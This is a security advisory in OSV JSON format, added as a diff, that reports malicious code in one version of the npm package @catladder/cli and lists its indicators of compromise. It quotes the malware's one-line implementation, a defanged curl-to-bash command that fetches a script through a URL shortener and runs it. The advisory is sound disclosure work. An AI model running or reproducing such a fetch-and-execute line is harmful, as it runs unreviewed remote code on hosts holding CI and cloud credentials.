@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-14312",
+  "modified": "2026-10-29T12:18:12Z",
+  "published": "2026-10-29T10:30:24Z",
+  "summary": "Malicious code in @catladder/cli (npm)",
+  "details": "This package ships a CLI subcommand that downloads an unpinned remote script through a URL shortener and pipes it directly into a shell. The command is declared in src/commands/project/commandGetMyTotalWorktime.ts and compiled into dist/apps/cli/src/commands/project/commandGetMyTotalWorktime.js and the bundled dist/bundles/cli/index.js; its entire implementation is `spawn(\"sh\", [\"-c\", \"curl -s -L hxxp://bit[.]ly/3VQEKNq | bash\"])`. Invoking `catladder project worktime` therefore fetches whatever the shortlink currently resolves to and executes it with the invoking user's privileges, on hosts where this CI/CD tool operates with GitLab/GitHub tokens, cloud credentials and npm publish tokens (the same package writes ${NPM_TOKEN} auth into a generated.npmrc for publishing). The shortlink target is not shipped in the package, is not pinned by any checksum, and can be changed by whoever controls the link, so the code that ends up running cannot be reviewed, version-pinned or audited by the installer. IOC: hxxp://bit[.]ly/3VQEKNq",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@catladder/cli",
+        "purl": "pkg:npm/%40catladder/cli"
+      },
+      "versions": [
+        "0.0.0-fix-image-hash-marker-9379938a"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@catladder/cli/v/0.0.0-fix-image-hash-marker-9379938a"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-14312"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-29T10:30:24Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "bit[.]ly"
+        ],
+        "sha256": [
+          "d73fe447e30303c02bfd96cb0b1fc552cc0dd71734229ceb5071d7100706a5d5"
+        ],
+        "url_observed": [
+          "hxxp://bit[.]ly/3VQEKNq"
+        ]
+      }
+    }
+  }
+}
